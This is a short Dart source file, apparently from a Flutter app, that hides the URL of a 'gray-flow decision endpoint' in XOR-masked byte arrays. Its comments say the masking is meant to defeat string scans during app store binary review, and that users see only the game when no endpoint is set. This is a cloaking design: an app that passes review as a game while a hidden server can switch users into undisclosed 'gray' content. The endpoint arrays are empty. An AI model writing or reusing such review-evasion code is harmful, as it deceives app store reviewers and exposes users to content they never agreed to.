import '../cipher/oracle_cipher.dart';

// ============================================================
// BRIDGE URI — masked address of the gray-flow decision endpoint
// ============================================================
// Two byte arrays — protocol+host and path — are XOR-masked with
// the project mantra (see oracle_cipher.dart) and concatenated on
// read. Splitting the URL into pieces foils naive `strings | grep`
// extraction during a Store binary scan.
//
// Fill the arrays with the output of `tool/encode_keys.dart` once
// the production endpoint is known. Until then, the resolver
// returns an empty string and the messenger short-circuits with
// a failure response, sending every user straight into the game.
// ============================================================

class BridgeUri {
  BridgeUri._();

  // TODO: paste output of tool/encode_keys.dart → "bridge.scheme_host"
  static const List<int> _schemeHost = <int>[];

  // TODO: paste output of tool/encode_keys.dart → "bridge.path"
  static const List<int> _path = <int>[];

  /// Reconstructs the full POST endpoint URL.
  /// Returns the empty string when no endpoint is configured;
  /// callers must treat that as an offline-only build.
  static String resolve() {
    if (_schemeHost.isEmpty) return '';
    return OracleCipher.reveal(_schemeHost) + OracleCipher.reveal(_path);
  }
}
